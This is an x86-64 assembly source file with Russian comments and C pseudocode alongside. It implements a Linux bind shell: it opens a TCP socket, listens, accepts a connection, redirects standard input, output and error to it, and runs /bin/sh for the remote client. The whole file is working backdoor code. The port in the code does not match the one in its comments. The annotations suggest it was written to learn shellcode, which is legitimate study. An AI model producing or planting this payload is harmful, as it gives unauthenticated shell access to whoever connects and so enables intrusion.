.include "defs.h"
/* declare in .bss section */
/* struct sockaddr_in sin = { 0, 0, 0 };*/
.section .bss
sin:
	sin_family:  .word  0
	sin_port:    .word  0
	sin_addr:    .int   0

/* declare in .data section
int sock;
int fd;
*/
.section .data
	sock: .quad 0
	fd: .quad 0
	bash: .ascii "//bin/sh"
	
/* declare in .text section 
const char *bash = "/bin/bash";
*/
.section .text
.global _start

_start:
/*;   sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	; create socket:
	; наполнение регистров для SYS_SOCKET
	; SYS_SOCKET    socket(2)
	
    ; rax : sys_socket (41)
    ; rdi : int family
    ; rsi : int type
    ; rdx : int protocol
*/
	movq $SYS_SOCKET, %rax
	movq $AF_INET, %rdi
	movq $SOCK_STREAM, %rsi
	movq $IPPROTO_TCP, %rdx
	syscall
	movq %rax, sock
	/*;sin.sin_family = AF_INET;*/
    movq $AF_INET, sin_family
    movw $7145, %ax /*; ax = 0.25 %rax = 0.5 % eax*/
    xchgb %ah, %al ; /*замена местами содержимого регистров. %ah=%al=0.125 %rax = 0.25 %eax*/
	/*;sin.sin_port = 0xXXXX;  = htons(YYYYY) */
    movw %ax, sin_port 
		
/*; bind socket
	; SYS_BIND      bind(2)
	
	; rax : sys_bind (49)
    ; rdi : socketid which will be in rax initially
    ; rsi : struct sokaddr *umyaddr - наша структура
    ; rdx : int addrlen 
*/	
    movq $SYS_BIND, %rax
    movq sock, %rdi
    movq $sin, %rsi
    movq $0x10, %rdx
    syscall
		
/*;listen to incoming connections:
	; SYS_LISTEN    listen(2)

    ; rax : sys_listen (50)
    ; rdi : socketid which is already in rdi
    ; rsi : int backlog
*/
	
    movq $SYS_LISTEN, %rax
    /*;movq sock, %rdi*/
    movq $1, %rsi
    syscall

/*;accept:
    ; SYS_ACCEPT    accept(2)
    ; Returns clientid needed for dup2

    ; rax : sys_accept (43)
    ; rdi : socketid already in rdi
    ; rsi : struct sockaddr *upeer_sockaddr
    ; rdx : int *upeer_addrlen 
*/
	
    movq $SYS_ACCEPT, %rax
    /*;movq sock, %rdi*/
    xor %rsi, %rsi
    /*movq $0, %rdx*/
	xor %rdx, %rdx
    syscall

    movq %rax, fd /*перенесли результат системного вызова (входящее соединение) в переменную, которая будет использоваться далее при создании дубликатов потоков ввода/вывода */

    movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $STDIN, %rsi
    syscall
/* вызвали sys_dup2 для STDIN */
	movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $STDOUT, %rsi
    syscall
/* вызвали sys_dup2 для STDOUT */
    movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $STDERR, %rsi
    syscall	
/* вызвали sys_dup2 для STDERR */
/* exec bash for remote client:
	; sys_execve

    ; rax : sys_execve (59)
    ; rdi : const char *filename
    ; rsi : const char *const argv[]
    ; rdx : const char *const envp[]
    ;xor %rax, %rax
    ;add $SYS_EXECVE, %rax
*/
	movq $SYS_EXECVE, %rax
    xor %r9, %r9
    push %r9

    movq bash, %rbx
    push %rbx

    movq %rsp, %rdi

    push %r9

	movq %rsp, %rdx 
    push %rdi
    movq %rsp, %rsi


	syscall	

/*	
;main() {
 
  ;  sin.sin_family = AF_INET;
   ; sin.sin_port = 0x7527;  = htons(10101) 
    ;bind(sock, &sin, sizeof(sin));
    ;listen(sock, 1);
    ;fd = accept(sock, NULL, NULL);
    ;dup2(fd, stdin);
    ;dup2(fd, stdout);
    ;dup2(fd, stderr);
    ;execve(bash, NULL, NULL);
;}*/
